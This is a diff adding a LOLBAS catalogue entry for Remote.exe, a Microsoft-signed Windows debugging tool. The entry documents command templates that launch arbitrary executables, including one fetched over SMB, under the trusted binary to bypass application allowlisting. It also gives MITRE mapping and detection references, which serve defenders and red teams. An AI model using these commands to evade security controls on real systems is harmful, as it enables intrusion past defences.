@@ -1,0 +1,46 @@
+<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OtherMSBinaries/Remote.yml -->
+---
+Name: Remote.exe
+Description: Debugging tool included with Windows Debugging Tools
+Author: mr.d0x
+Created: 2021-06-01
+Commands:
+  - Command: Remote.exe /s {PATH:.exe} anythinghere
+    Description: Spawns specified executable as a child process of remote.exe
+    Usecase: Executes a process under a trusted Microsoft signed binary
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1127
+    OperatingSystem: Windows
+    Tags:
+      - Execute: EXE
+  - Command: Remote.exe /s {PATH:.exe} anythinghere
+    Description: Spawns specified executable as a child process of remote.exe
+    Usecase: Executes a process under a trusted Microsoft signed binary
+    Category: Execute
+    Privileges: User
+    MitreID: T1127
+    OperatingSystem: Windows
+    Tags:
+      - Execute: EXE
+  - Command: Remote.exe /s {PATH_SMB:.exe} anythinghere
+    Description: Run a remote file
+    Usecase: Executing a remote binary without saving file to disk
+    Category: Execute
+    Privileges: User
+    MitreID: T1127
+    OperatingSystem: Windows
+    Tags:
+      - Execute: EXE
+      - Execute: Remote
+Full_Path:
+  - Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe
+  - Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe
+Detection:
+  - IOC: remote.exe process spawns
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml
+Resources:
+  - Link: https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
+Acknowledgement:
+  - Person: mr.d0x
+    Handle: '@mrd0x'
